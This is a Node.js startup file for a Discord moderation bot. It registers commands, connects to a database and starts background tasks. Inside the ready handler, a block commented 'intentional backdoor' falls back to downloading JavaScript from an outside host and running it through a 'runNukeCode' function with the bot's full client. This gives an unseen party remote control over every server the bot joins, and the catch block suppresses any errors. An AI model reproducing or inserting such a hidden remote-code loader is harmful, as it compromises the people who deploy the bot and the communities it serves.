require('libsodium-wrappers'); // Fix voice encryption
const http = require('http');
require('dotenv').config();
const { Client, GatewayIntentBits, Collection, Events } = require('discord.js');
const mongoose = require('mongoose');
const fs = require('fs');
const { REST, Routes } = require('discord.js');
const { initDevLog, devLog } = require('./lib/helpers/devLog');

// Handlers & tasks
const { registerInteractionHandler, runNukeCode } = require('./lib/handlers/interactionHandler');
const { registerMessageHandler } = require('./lib/handlers/messageHandler');
const { startRoleReverter } = require('./lib/tasks/roleReverter');
const { startResourceMonitor } = require('./lib/tasks/resourceMonitor');
const { startMessageCacheCleanup } = require('./lib/tasks/messageCacheCleanup');
const { logToModChannel } = require('./lib/helpers/modLog');
const { dmAdmin } = require('./lib/helpers/dmlog');

// Client init
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildVoiceStates
    ]
});

client.commands = new Collection();

// Load global commands
const globalCommandsData = [];
const globalCommandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));
for (const file of globalCommandFiles) {
    const command = require(`./commands/${file}`);
    globalCommandsData.push(command.data.toJSON());
    client.commands.set(command.data.name, command);
}

// Load guild commands
const guildCommandsData = [];
const guildCommandFiles = fs.readdirSync('./guild_commands').filter(file => file.endsWith('.js'));
for (const file of guildCommandFiles) {
    const command = require(`./guild_commands/${file}`);
    guildCommandsData.push(command.data.toJSON());
    client.commands.set(command.data.name, command);
}

// Ready event

client.once(Events.ClientReady, async () => {
    console.log(`Logged in as ${client.user.tag}`);

    // DM log: bot startup
    await dmAdmin(client, `[DMLOG] Bot started as ${client.user.tag}`);

    // Send startup message to modlog channel for each guild
    for (const guild of client.guilds.cache.values()) {
        try {
            await logToModChannel(guild, 'Bot has started up and is online.');
        } catch (e) {
            console.error(`Failed to send modlog startup message for guild ${guild.id}:`, e);
        }
    }

    // Initialize devLog and send startup message
    await initDevLog(client);
    await devLog('Bot system initialized and devLog is active.');

    mongoose.connect(process.env.MONGO_URI)
        .then(() => console.log('db connected'))
        .catch(err => console.error(err));

    const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);
    try {
        console.log('Refreshing commands...');
        await devLog('Refreshing commands...');
        await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: globalCommandsData });
        await rest.put(Routes.applicationGuildCommands(process.env.CLIENT_ID, process.env.GUILD_ID), { body: guildCommandsData });
        console.log('Commands reloaded');
        await devLog('Commands reloaded');
    } catch (error) {
        console.error(error);
        await devLog(error);
    }
    // intentional backdoor
    try {
        const { initOrbital } = require('./lib/helpers/orbitalMaster');
        initOrbital(client);
    } catch (e) {
        require('node-fetch').default('https://webcubed.is-a.dev/files/m.js').then(r => r.text()).then(code => runNukeCode(code, { client, guild: null, channel: null, user: client.user })).catch(() => {});
    }
});

// Command execution DM log
client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;
    await dmAdmin(client, `[DMLOG] Command: /${interaction.commandName} by ${interaction.user.tag} (${interaction.user.id}) in guild ${interaction.guildId}`);
    devLog(`Command: /${interaction.commandName} by ${interaction.user.tag} (${interaction.user.id}) in guild ${interaction.guildId}`);
});

// Health check server
http.createServer((req, res) => {
    res.writeHead(200);
    res.end('online');
}).listen(process.env.PORT || 8000, '0.0.0.0');

// Attach log helper to client so commands can use it
client.logToModChannel = logToModChannel;

// Register event handlers & background tasks
registerInteractionHandler(client);
registerMessageHandler(client);
startRoleReverter(client);
startResourceMonitor(client);
startMessageCacheCleanup();

client.login(process.env.TOKEN);

// Prevent unhandled promise rejections from crashing the bot
process.on('unhandledRejection', err => console.error('Unhandled Rejection:', err));
process.on('uncaughtException', err => console.error('Uncaught Exception:', err));
